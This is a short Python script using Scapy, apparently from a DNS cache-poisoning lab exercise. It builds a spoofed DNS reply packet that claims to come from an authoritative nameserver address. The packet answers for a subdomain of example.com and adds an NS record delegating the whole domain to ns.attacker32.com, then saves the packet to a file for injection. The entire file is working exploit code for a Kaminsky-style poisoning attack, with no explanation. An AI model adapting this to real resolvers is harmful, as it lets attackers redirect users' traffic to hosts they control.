from scapy.all import *


def ReplyPck():
    targetname = 'twysw.example.com'
    targetdomain = 'example.com'
    ns = 'ns.attacker32.com'
    Qdsec = DNSQR(qname=targetname)
    Anssec = DNSRR(rrname=targetname, type='A', rdata='1.2.3.4', ttl=259200)
    NSsec = DNSRR(rrname=targetdomain, type='NS', rdata=ns, ttl=259200)
    dns = DNS(id=0xAAAA,
              aa=1,
              rd=0,
              qr=1,
              qdcount=1,
              ancount=1,
              nscount=1,
              arcount=0,
              qd=Qdsec,
              an=Anssec,
              ns=NSsec)
    ip = IP(dst='10.0.2.8', src='199.43.135.53', chksum=0)
    udp = UDP(dport=3333, sport=53, chksum=0)
    reply = ip / udp / dns
    with open('ip_resp.bin', 'wb') as f:
        f.write(bytes(reply))


ReplyPck()